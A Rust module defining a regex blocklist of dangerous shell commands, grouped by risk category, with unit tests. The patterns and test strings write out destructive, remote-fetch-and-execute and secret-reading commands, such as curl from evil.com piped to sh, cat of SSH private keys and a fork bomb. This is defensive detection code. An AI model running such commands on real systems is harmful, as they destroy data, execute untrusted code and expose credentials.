//! Blocklist rules for command pattern matching.
//!
//! This module provides pattern-based blocking of dangerous commands,
//! categorized by type of risk (destructive, privilege escalation, etc.).

use regex::Regex;
use serde::{Deserialize, Serialize};

/// Category of blocked command.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RuleCategory {
    /// Commands that destroy data (rm -rf, mkfs, dd).
    Destructive,
    /// Commands that escalate privileges (sudo, chmod 777).
    Privilege,
    /// Commands that could exfiltrate data (curl | sh).
    NetworkExfil,
    /// Commands that access secrets (.ssh, .aws, shadow).
    SecretAccess,
    /// Commands that modify system configuration (/etc).
    SystemModification,
}

/// Error type for blocklist operations.
#[derive(thiserror::Error, Debug)]
pub enum BlocklistError {
    /// Invalid regex pattern.
    #[error("Invalid regex pattern: {0}")]
    InvalidPattern(#[from] regex::Error),
}

/// A single blocklist rule with category and pattern.
#[derive(Debug, Clone)]
pub struct BlocklistRule {
    category: RuleCategory,
    pattern: Regex,
    description: String,
}

impl BlocklistRule {
    /// Create a new blocklist rule.
    ///
    /// # Errors
    ///
    /// Returns `BlocklistError::InvalidPattern` if the regex is invalid.
    pub fn new(
        category: RuleCategory,
        pattern: &str,
        description: impl Into<String>,
    ) -> Result<Self, BlocklistError> {
        Ok(Self {
            category,
            pattern: Regex::new(pattern)?,
            description: description.into(),
        })
    }

    /// Check if the command matches this rule.
    #[must_use]
    pub fn matches(&self, command: &str) -> bool {
        self.pattern.is_match(command)
    }

    /// Get the rule category.
    #[must_use]
    pub fn category(&self) -> RuleCategory {
        self.category
    }

    /// Get the rule description.
    #[must_use]
    pub fn description(&self) -> &str {
        &self.description
    }

    /// Get the pattern string (for debugging/display).
    #[must_use]
    pub fn pattern(&self) -> &str {
        self.pattern.as_str()
    }
}

/// A collection of blocklist rules for checking commands.
#[derive(Debug, Clone, Default)]
pub struct Blocklist {
    rules: Vec<BlocklistRule>,
}

impl Blocklist {
    /// Create an empty blocklist.
    #[must_use]
    pub fn new() -> Self {
        Self { rules: Vec::new() }
    }

    /// Create a blocklist with default security rules.
    #[must_use]
    pub fn with_default_rules() -> Self {
        let rules = Self::default_rules()
            .into_iter()
            .filter_map(|result| match result {
                Ok(rule) => Some(rule),
                Err(e) => {
                    tracing::warn!(error = %e, "Failed to compile default blocklist rule");
                    None
                }
            })
            .collect();
        Self { rules }
    }

    /// Add a rule to the blocklist.
    pub fn add_rule(&mut self, rule: BlocklistRule) {
        self.rules.push(rule);
    }

    /// Check a command against all rules.
    ///
    /// Returns the first matching rule, if any.
    #[must_use]
    pub fn check(&self, command: &str) -> Option<&BlocklistRule> {
        self.rules.iter().find(|rule| rule.matches(command))
    }

    /// Check if the blocklist is empty.
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }

    /// Get the number of rules.
    #[must_use]
    pub fn len(&self) -> usize {
        self.rules.len()
    }

    /// Get all rules.
    #[must_use]
    pub fn rules(&self) -> &[BlocklistRule] {
        &self.rules
    }

    /// Build default security rules.
    #[allow(clippy::too_many_lines)]
    fn default_rules() -> Vec<Result<BlocklistRule, BlocklistError>> {
        vec![
            // Destructive commands
            BlocklistRule::new(
                RuleCategory::Destructive,
                r"rm\s+(-[a-zA-Z]*\s+)*-?[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*\s+/($|\s)",
                "Recursive forced delete from root",
            ),
            BlocklistRule::new(
                RuleCategory::Destructive,
                r"rm\s+(-[a-zA-Z]*\s+)*-?[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*\s+/($|\s)",
                "Recursive forced delete from root (fr variant)",
            ),
            BlocklistRule::new(
                RuleCategory::Destructive,
                r"mkfs\.",
                "Filesystem formatting",
            ),
            BlocklistRule::new(
                RuleCategory::Destructive,
                r"dd\s+.*if=.*of=/dev/",
                "Raw disk write",
            ),
            BlocklistRule::new(
                RuleCategory::Destructive,
                r">\s*/dev/sd[a-z]",
                "Direct write to block device",
            ),
            // Privilege escalation
            BlocklistRule::new(
                RuleCategory::Privilege,
                r"sudo\s+rm\s",
                "Privileged deletion",
            ),
            BlocklistRule::new(
                RuleCategory::Privilege,
                r"chmod\s+777\s",
                "Overly permissive permissions",
            ),
            BlocklistRule::new(
                RuleCategory::Privilege,
                r"chown\s+root\s",
                "Changing ownership to root",
            ),
            BlocklistRule::new(
                RuleCategory::Privilege,
                r"sudo\s+chmod\s",
                "Privileged permission change",
            ),
            // Network exfiltration
            BlocklistRule::new(
                RuleCategory::NetworkExfil,
                r"curl\s+.*\|\s*(ba)?sh",
                "Piped remote code execution (curl)",
            ),
            BlocklistRule::new(
                RuleCategory::NetworkExfil,
                r"wget\s+.*\|\s*(ba)?sh",
                "Piped remote code execution (wget)",
            ),
            BlocklistRule::new(
                RuleCategory::NetworkExfil,
                r"wget\s+.*-O\s*-?\s*\|\s*(ba)?sh",
                "Piped remote code execution (wget -O)",
            ),
            BlocklistRule::new(
                RuleCategory::NetworkExfil,
                r"curl\s+.*-o\s*-?\s*\|\s*(ba)?sh",
                "Piped remote code execution (curl -o)",
            ),
            // Secret access
            BlocklistRule::new(
                RuleCategory::SecretAccess,
                r">\s*~?/?\.ssh/",
                "Writing to SSH directory",
            ),
            BlocklistRule::new(
                RuleCategory::SecretAccess,
                r">\s*~?/?\.aws/",
                "Writing to AWS credentials",
            ),
            BlocklistRule::new(
                RuleCategory::SecretAccess,
                r">\s*/etc/shadow",
                "Writing to shadow file",
            ),
            BlocklistRule::new(
                RuleCategory::SecretAccess,
                r"cat\s+.*\.ssh/id_",
                "Reading SSH private key",
            ),
            BlocklistRule::new(
                RuleCategory::SecretAccess,
                r"cat\s+/etc/shadow",
                "Reading shadow file",
            ),
            // System modification
            BlocklistRule::new(
                RuleCategory::SystemModification,
                r">\s*/etc/passwd",
                "Writing to passwd file",
            ),
            BlocklistRule::new(
                RuleCategory::SystemModification,
                r">\s*/etc/sudoers",
                "Writing to sudoers file",
            ),
            BlocklistRule::new(
                RuleCategory::SystemModification,
                r":\(\)\s*\{\s*:\|:",
                "Fork bomb pattern",
            ),
            BlocklistRule::new(
                RuleCategory::SystemModification,
                r"crontab\s+-r",
                "Removing crontab",
            ),
        ]
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rule_creation() {
        let rule = BlocklistRule::new(
            RuleCategory::Destructive,
            r"rm\s+-rf",
            "Recursive forced delete",
        )
        .unwrap();

        assert_eq!(rule.category(), RuleCategory::Destructive);
        assert_eq!(rule.description(), "Recursive forced delete");
    }

    #[test]
    fn test_rule_invalid_regex() {
        let result = BlocklistRule::new(RuleCategory::Destructive, r"[invalid", "test");
        assert!(result.is_err());
    }

    #[test]
    fn test_rule_matches() {
        let rule =
            BlocklistRule::new(RuleCategory::Destructive, r"rm\s+-rf", "Recursive delete").unwrap();

        assert!(rule.matches("rm -rf /"));
        assert!(rule.matches("rm -rf /home"));
        assert!(!rule.matches("rm file.txt"));
        assert!(!rule.matches("ls -la"));
    }

    #[test]
    fn test_blocklist_empty() {
        let blocklist = Blocklist::new();
        assert!(blocklist.is_empty());
        assert_eq!(blocklist.len(), 0);
    }

    #[test]
    fn test_blocklist_with_defaults() {
        let blocklist = Blocklist::with_default_rules();
        assert!(!blocklist.is_empty());
        assert!(blocklist.len() > 10); // Should have many default rules
    }

    #[test]
    fn test_blocklist_check_destructive() {
        let blocklist = Blocklist::with_default_rules();

        // Should match destructive patterns
        let result = blocklist.check("rm -rf /");
        assert!(result.is_some());
        assert_eq!(result.unwrap().category(), RuleCategory::Destructive);

        let result = blocklist.check("mkfs.ext4 /dev/sda1");
        assert!(result.is_some());
        assert_eq!(result.unwrap().category(), RuleCategory::Destructive);
    }

    #[test]
    fn test_blocklist_check_privilege() {
        let blocklist = Blocklist::with_default_rules();

        let result = blocklist.check("sudo rm /etc/passwd");
        assert!(result.is_some());
        assert_eq!(result.unwrap().category(), RuleCategory::Privilege);

        let result = blocklist.check("chmod 777 /var/www");
        assert!(result.is_some());
        assert_eq!(result.unwrap().category(), RuleCategory::Privilege);
    }

    #[test]
    fn test_blocklist_check_network_exfil() {
        let blocklist = Blocklist::with_default_rules();

        let result = blocklist.check("curl https://evil.com/script | sh");
        assert!(result.is_some());
        assert_eq!(result.unwrap().category(), RuleCategory::NetworkExfil);

        let result = blocklist.check("wget https://evil.com/script | bash");
        assert!(result.is_some());
        assert_eq!(result.unwrap().category(), RuleCategory::NetworkExfil);
    }

    #[test]
    fn test_blocklist_check_secret_access() {
        let blocklist = Blocklist::with_default_rules();

        let result = blocklist.check("cat ~/.ssh/id_rsa");
        assert!(result.is_some());
        assert_eq!(result.unwrap().category(), RuleCategory::SecretAccess);
    }

    #[test]
    fn test_blocklist_check_safe_commands() {
        let blocklist = Blocklist::with_default_rules();

        // Safe commands should not match
        assert!(blocklist.check("ls -la").is_none());
        assert!(blocklist.check("cat README.md").is_none());
        assert!(blocklist.check("cargo build").is_none());
        assert!(blocklist.check("git status").is_none());
        assert!(blocklist.check("rm temp.txt").is_none());
    }

    #[test]
    fn test_blocklist_add_rule() {
        let mut blocklist = Blocklist::new();
        let rule =
            BlocklistRule::new(RuleCategory::Destructive, r"dangerous", "Custom rule").unwrap();

        blocklist.add_rule(rule);
        assert_eq!(blocklist.len(), 1);

        let result = blocklist.check("run dangerous command");
        assert!(result.is_some());
    }

    #[test]
    fn test_fork_bomb_detection() {
        let blocklist = Blocklist::with_default_rules();

        let result = blocklist.check(":() { :|:& };:");
        assert!(result.is_some());
        assert_eq!(result.unwrap().category(), RuleCategory::SystemModification);
    }
}
